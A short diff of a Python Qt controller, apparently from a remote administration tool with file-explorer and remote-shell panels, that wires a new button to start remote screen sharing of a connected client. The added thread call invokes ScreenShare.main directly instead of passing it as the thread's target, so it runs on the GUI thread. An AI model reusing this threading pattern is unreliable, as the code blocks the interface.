@@ -1,3 +1,4 @@
+import ScreenShare
 from NetProtocol import *
 import time
 import threading
@@ -51,6 +52,7 @@ class ClientInspectorController(QObject):
         self.view.connectionInformationTable.initializeClient(client)
         self.shown = threading.Event()
         self.view.TabContainer.currentChanged.connect(self.tabChanged)
+        self.view.pushButton_3.clicked.connect(self.remoteDekstopButtonClicked)
         self.fileExplorerManager = FileExplorerManager(client, self.view)
         self.remoteShellManager = RemoteShellManager(client, self)
         client.dataLock.acquire_read()
@@ -75,6 +77,10 @@ class ClientInspectorController(QObject):
     def startThreads(self):
         self.updateMetricsThread = threading.Thread(target=self.updateMetrics)
         self.updateMetricsThread.start()
+
+    def remoteDekstopButtonClicked(self):
+        worker = threading.Thread(target=ScreenShare.main(self.client))
+        worker.start()
 
     def close(self):
         if self.shown.is_set():
